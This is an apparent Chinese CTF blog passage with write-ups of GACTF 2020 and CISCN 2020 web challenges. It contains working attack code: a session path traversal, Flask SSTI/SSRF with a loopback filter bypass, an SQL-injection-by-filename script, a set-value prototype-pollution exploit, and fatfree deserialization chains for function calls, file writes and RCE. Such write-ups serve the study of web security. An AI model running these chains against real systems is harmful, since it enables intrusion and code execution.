<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;圣殿 = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 种植(<span class="params">$货物, $食物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;贡品 = $货物;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;朝拜圣地 . <span class="string">&#x27;/sess_&#x27;</span> . $货物, $食物) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 收获(<span class="params">$货物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;贡品 = $货物;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">string</span>)@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;朝拜圣地 . <span class="string">&#x27;/sess_&#x27;</span> . $货物);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 总结(<span class="params">$货物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;圣殿) &lt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;朝拜圣地 . <span class="string">&#x27;/note_&#x27;</span> . <span class="variable">$this</span>-&gt;圣殿, $货物) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 归纳(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">string</span>)@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;朝拜圣地 . <span class="string">&#x27;/note_&#x27;</span> . <span class="variable">$this</span>-&gt;贡品);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 思考(<span class="params">$货物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;贡品 = $货物;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;朝拜圣地 . <span class="string">&#x27;/sess_&#x27;</span> . $货物)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;朝拜圣地 . <span class="string">&#x27;/sess_&#x27;</span> . $货物);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 反省(<span class="params">$货物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="variable">$this</span>-&gt;朝拜圣地 . <span class="string">&#x27;/*&#x27;</span>) <span class="keyword">as</span> $元素) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">filemtime</span>($元素) + $货物 &lt; <span class="title function_ invoke__">time</span>() &amp;&amp; <span class="title function_ invoke__">file_exists</span>($元素)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>($元素);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 完毕(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;总结(<span class="variable language_">$this</span>-&gt;归纳());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$齿轮 = <span class="keyword">new</span> 造齿轮();</span><br><span class="line"><span class="title function_ invoke__">session_set_save_handler</span>(<span class="keyword">array</span>($齿轮, <span class="string">&#x27;挖掘&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;完毕&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;收获&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;种植&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;反省&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;完毕&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">mktime</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">$盛世 = <span class="keyword">array</span>(<span class="title function_ invoke__">rand</span>() =&gt; <span class="keyword">array</span>(<span class="string">&#x27;alice&#x27;</span>, <span class="number">1</span>), <span class="title function_ invoke__">rand</span>() =&gt; <span class="keyword">array</span>(<span class="string">&#x27;bob&#x27;</span>, <span class="number">5</span>), <span class="title function_ invoke__">rand</span>() =&gt; <span class="keyword">array</span>(<span class="string">&#x27;cat&#x27;</span>, <span class="number">20</span>), <span class="title function_ invoke__">rand</span>() =&gt; <span class="keyword">array</span>(<span class="string">&#x27;dog&#x27;</span>, <span class="number">15</span>), <span class="title function_ invoke__">rand</span>() =&gt; <span class="keyword">array</span>(<span class="string">&#x27;evil&#x27;</span>, <span class="number">5</span>), <span class="title function_ invoke__">rand</span>() =&gt; <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="number">9999</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> 化缘(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 取经(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $盛世;</span><br><span class="line">    $宝藏 = <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>] <span class="keyword">as</span> $元素) $宝藏 .= $盛世[$元素][<span class="number">0</span>] . <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">    $宝藏 .= <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $宝藏;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 念经(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $齿轮;</span><br><span class="line">    <span class="keyword">return</span> $齿轮-&gt;归纳();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 造世(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $盛世;</span><br><span class="line">    $宝藏 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($盛世 <span class="keyword">as</span> $按键 =&gt; $元素) $宝藏 .= <span class="string">&#x27;&lt;div class=&quot;item&quot;&gt;&lt;form method=&quot;POST&quot;&gt;&lt;div class=&quot;form-group&quot;&gt;&#x27;</span> . $元素[<span class="number">0</span>] . <span class="string">&#x27;&lt;/div&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&#x27;</span> . $按键 . <span class="string">&#x27;&quot;&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt;buy ($&#x27;</span> . $元素[<span class="number">1</span>] . <span class="string">&#x27;)&lt;/button&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $宝藏;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>])) <span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] = <span class="number">2233</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>])) <span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>] = [];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;note&#x27;</span>])) <span class="variable">$_SESSION</span>[<span class="string">&#x27;note&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] &gt;= $盛世[<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]][<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] = <span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] - $盛世[<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]][<span class="number">1</span>];</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>($&#123;<span class="string">&#x27;_SESSION&#x27;</span>&#125;[<span class="string">&#x27;items&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;span style=&quot;color:green&quot;&gt;buy succ!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;lack of balance!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;note&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;note&#x27;</span>]) &lt;= <span class="number">1</span> &lt;&lt; <span class="number">10</span>) &#123;</span><br><span class="line">        $齿轮-&gt;总结(<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;&amp;amp;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>), <span class="variable">$_POST</span>[<span class="string">&#x27;note&#x27;</span>]));</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;span style=&quot;color:green&quot;&gt;write succ!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;note too long!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>阅读源码我们可以看出，出题人自行注册了session数据存储机制，将session数据存储在了web目录下，文件名后半部分可控。<br>参考php <code>session_set_save_handler</code>函数手册，结合源码，我们可以发现源码对sessionid进行了简单过滤。</p><p>如何解这道题呢？</p><h3 id="最简单的解法">最简单的解法</h3><p>首先我们可以看到Accounts页面中回显了<code>note_</code>文件的内容，我们能够控制这个文件的路径，而这里存在目录穿越<br>所以我们把sessionid设置成<code>../../../../flag</code>就行了。flag文件我们没权限写，读权限还是有的。我们是这么做出来的（（</p><h3 id="出题人可能预期的解法">出题人可能预期的解法</h3><p>虽然题已经做出来了，但是后面貌似出题人将flag加入了关键词检测。看一看源码，有两个有趣的地方</p><ul><li><code>srand(固定值)</code></li><li>session处理的逻辑写在了一个类里面，有<code>__destruct</code>，且反序列化可以绕过对sessionid的waf</li></ul><p>具体怎么做还没来得及研究，之后有空了再说吧</p><h2 id="EZFLASK">EZFLASK</h2><p>出题人给出了部分源码，明摆着就是想让我们去访问admin路由。<br><a href="https://docs.python.org/3/reference/datamodel.html?highlight=__globals__">__globals__到底是什么</a></p><p><code>&#123;&#123;index.__globals__&#125;&#125;</code></p><img src="/2020/09/01/Security/Writeup/GACTF-2020-Web/upload_e92ae998edaadf1d01a758abe82e4d47.png" class="" title="aaa"><p>于是我们可以看出admin路由为<code>/h4rdt0f1nd_9792uagcaca00qjaf</code>，访问后发现是一个requests的ssrf点。<br>还有一个ctf函数我们还没有用过，看出题人的意思是那里有一些提示。通过<a href="https://docs.python.org/3/reference/datamodel.html?highlight=__code__">__code__属性</a>我们可以一窥ctf函数中的常量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;ctf.__code__.co_consts&#125;&#125;:</span><br><span class="line">可知：</span><br><span class="line"></span><br><span class="line">hint = <span class="string">&#x27;the admin route :h4rdt0f1nd_9792uagcaca00qjaf&lt;!-- port : 5000 --&gt;&#x27;</span></span><br><span class="line">trick = <span class="string">&#x27;too young too simple&#x27;</span></span><br></pre></td></tr></table></figure><p>提示说5000端口有另一个服务。但是当我们尝试访问<code>127.0.0.1</code>时发现有waf。梅开二度，我们可以通过<code>__code__</code>来大体看到waf规则：</p><img src="/2020/09/01/Security/Writeup/GACTF-2020-Web/upload_f4abe482d6ed5160ea58f93868f0cce4.png" class="" title="Result"><p>0.0被过滤了。冷知识时间：本地回环地址为<code>127.0.0.0/8</code>，这个掩码<code>8</code>是不是看起来不太直观？我们换个样子试试：<code>255.0.0.0</code>。</p><p>所以访问<code>127.114.51.4:5000</code>，看到内层的应用是一个裸的ssti，flag在app.config里。然而ssrf的path在外层进行了过滤(<code>waf_path</code>)。很可惜，<code>waf_path.__code__.co_consts</code>由于长度问题被过滤了，过滤规则只能通过盲猜。</p><p>经过一系列尝试，在<code>url_for.__globals__.current_app</code>找到了app对象。</p><h2 id="carefuleyes">carefuleyes</h2><p>整体上就是Hitcon 2016 babytrick梅开二度，随便找一个注入点就行了</p><p>rename.php中有一个自注入，很刻意</p><p>我 注 我 自 己</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line"><span class="comment"># host = &#x27;http://124.71.191.175&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;http://202.182.118.236&#x27;</span></span><br><span class="line"><span class="comment"># host = &#x27;http://localhost&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;frankli\&#x27; and 1=0 union select 1,`password` as filename,3,4,5 from user where username=\&#x27;XM\&#x27; #.txt&#x27;</span></span><br><span class="line">ses.post(host + <span class="string">&#x27;/upload.php&#x27;</span>, files=&#123;</span><br><span class="line">    <span class="string">&#x27;upfile&#x27;</span>: (file, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">&#125;).text</span><br><span class="line">passwd = ses.get(host + <span class="string">&#x27;/rename.php&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;oldname&#x27;</span>: file[:-<span class="number">4</span>],</span><br><span class="line">    <span class="string">&#x27;newname&#x27;</span>: <span class="string">&#x27;asdf&#x27;</span></span><br><span class="line">&#125;).text</span><br><span class="line">passwd = passwd[<span class="number">14</span>:passwd.find(<span class="string">&#x27;will be changed&#x27;</span>) - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XCTFGG</span>:</span><br><span class="line">    private_method = <span class="string">&#x27;login&#x27;</span></span><br><span class="line">    private_args = [<span class="string">&#x27;XM&#x27;</span>, passwd]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ses.post(host + <span class="string">&#x27;/upload.php&#x27;</span>, files=&#123;</span><br><span class="line">    <span class="string">&#x27;upfile&#x27;</span>: (<span class="string">&#x27;frank.txt&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">&#125;, params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: serialize(XCTFGG())</span><br><span class="line">&#125;).text)</span><br></pre></td></tr></table></figure><h2 id="simple-flask-与-XWiki">simple flask 与 XWiki</h2><p>略。simple flask抢了个一血，挺开心的（</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;babyshop&quot;&gt;babyshop&lt;/h2&gt;
&lt;p&gt;上来一个小商城，懵了一圈以后扫了一下目录，发现有git泄露。源码脱下来以后发现进行了混淆。&lt;br&gt;
这个混淆有意思啊，所有的变量名甚至都是有意义的，难不成是出题人人 工 混 淆？&lt;/p&gt;
&lt;p&gt;简单浏览以后通过</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>第十三届全国大学生信息安全竞赛西北赛区 Web题目 Writeup</title>
    <link href="https://blog.frankli.site/2020/08/21/Security/Writeup/CISCN%202020/"/>
    <id>https://blog.frankli.site/2020/08/21/Security/Writeup/CISCN%202020/</id>
    <published>2020-08-20T16:00:00.000Z</published>
    <updated>2025-10-19T20:33:15.794Z</updated>
    
    <content type="html"><![CDATA[<p>Web狗无法在险恶的CTF世界中存活</p><p>CISCN2020 落幕，web所有题加起来还不如misc/crypto/re题的零头，吐了</p><h2 id="littlegame">littlegame</h2><p>js原型链污染，<code>set-value</code>库3.0.0旧版本。公开exploit如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> paths = [<span class="string">&#x27;constructor.prototype.a0&#x27;</span>, <span class="string">&#x27;__proto__.a1&#x27;</span>,];</span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> p <span class="keyword">of</span> paths) &#123; <span class="title function_">setFn</span>(&#123;&#125;, p, <span class="literal">true</span>); &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; paths.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a<span class="subst">$&#123;i&#125;</span>`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Yes with <span class="subst">$&#123;paths[i]&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>拿来主义，用就完了</p><p>阅读源码，可以发现在<code>/Privilege</code>处进行了<code>set-value</code>调用，并且在<code>/DeveloperControlPanel</code>处检查了<code>Admin</code>对象（一个普通的数组）的任意可控属性，那污染字典类型的原型，添加一个自定义属性即可。</p><p>最终exploit：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line">ses = session()</span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ses.get(host + <span class="string">&#x27;/SpawnPoint&#x27;</span>)</span><br><span class="line">ses.post(host + <span class="string">&#x27;/Privilege&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;NewAttributeKey&#x27;</span>: <span class="string">&#x27;__proto__.pwd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NewAttributeValue&#x27;</span>: <span class="string">&#x27;frankli&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(ses.post(host + <span class="string">&#x27;/DeveloperControlPanel&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;pwd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;frankli&#x27;</span></span><br><span class="line">&#125;).text)</span><br></pre></td></tr></table></figure><h2 id="babyserialize">babyserialize</h2><p>fatfree框架POP链挖掘</p><p>前段时间在WMCTF中挖的链被断掉了，稍微改一改</p><p>第一次见flag直接放phpinfo里头的。。。找了半天没找到。。。</p><p>在这里把挖到的几条链都放一下吧</p><h3 id="单个任意参数调用任意函数">单个任意参数调用任意函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WS</span>:</span><br><span class="line">    <span class="comment"># call func with one param</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, param</span>):</span><br><span class="line"><span class="meta">        @namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Agent</span>():</span><br><span class="line">            <span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line"><span class="meta">                @namespace(<span class="params"><span class="string">&#x27;DB\\Jig&#x27;</span></span>)</span></span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">Mapper</span>:</span><br><span class="line"><span class="meta">                    @namespace(<span class="params"><span class="string">&#x27;DB\\SQL&#x27;</span></span>)</span></span><br><span class="line">                    <span class="keyword">class</span> <span class="title class_">Mapper</span>:</span><br><span class="line">                        protected_props = &#123;<span class="string">&#x27;read&#x27;</span>: func&#125;</span><br><span class="line">                    protected_file = param</span><br><span class="line">                    protected_db = Mapper()</span><br><span class="line">                events = &#123;<span class="string">&#x27;disconnect&#x27;</span>: [Mapper(), <span class="string">&#x27;insert&#x27;</span>]&#125;</span><br><span class="line">            protected_server = Base()</span><br><span class="line">        <span class="variable language_">self</span>.a = Agent()  <span class="comment"># autoload</span></span><br><span class="line"><span class="comment"># payload: serialize(WS())</span></span><br></pre></td></tr></table></figure><h3 id="任意文件写">任意文件写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;DB&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Jig</span>:</span><br><span class="line">    <span class="comment"># write file</span></span><br><span class="line">    lazy = <span class="literal">True</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;frankli.php&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;asdf&#x27;</span>: <span class="string">&#x27;&lt;?php phpinfo();exit();?&gt;&#x27;</span></span><br><span class="line">    &#125;&#125;</span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">    <span class="built_in">format</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="任意（存在的）文件包含">任意（存在的）文件包含</h3><p>结合上面调用函数的链调用<code>\View-&gt;render</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">View</span>:</span><br><span class="line">    <span class="comment"># arbitrary **exisiting** file inclusion</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line">        TEMP = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">        UI = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">    fw = Base()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ses.get(url, params=&#123;<span class="string">&#x27;flag&#x27;</span>: serialize(</span><br><span class="line">    WS([View(), <span class="string">&#x27;render&#x27;</span>], <span class="string">&#x27;frankli.php&#x27;</span>))&#125;</span><br><span class="line">).text)</span><br></pre></td></tr></table></figure><h3 id="wmctf的时候挖的rce链">wmctf的时候挖的rce链</h3><p>结合上面调用函数的链调用<code>\Preview-&gt;resolve</code><br>然而这次<code>resolve</code>被删了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WS</span>:</span><br><span class="line"><span class="meta">    @namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Agent</span>():</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">F3</span>:  <span class="comment"># 随便一个存在的类</span></span><br><span class="line">            <span class="keyword">class</span> <span class="title class_">Preview</span>:</span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line">                    hive = &#123;<span class="string">&#x27;node&#x27;</span>: <span class="string">f&#x27;&lt;?php system(&quot;ls&quot;);die(1);?&gt;&#x27;</span>&#125;</span><br><span class="line">                fw = Base()</span><br><span class="line">            events = &#123;<span class="string">&#x27;disconnect&#x27;</span>: [Preview(), <span class="string">&#x27;resolve&#x27;</span>]&#125;</span><br><span class="line">        server = F3()</span><br><span class="line">    a = Agent()</span><br></pre></td></tr></table></figure><p>入口点和上面函数调用的是一样的</p><h2 id="easytrick">easytrick</h2><p>一开始是联想到了Nu1l在某处的论坛里发的利用<code>Exception</code>的<code>__toString</code>来绕过判等（属性不同，不强等于），但是无奈太长了<br><code>SimpleXMLElement</code>也找不到合适的方式利用(有可能么？)</p><p>后来想了想，不可能是利用对象的<code>__toString</code>来绕过，因为这样无法同时绕过三个判断</p><p>最后发现<code>1.00...001</code>在转字符串的时候会变成<code>1</code></p><figure class="highlight python"><table><tr><td 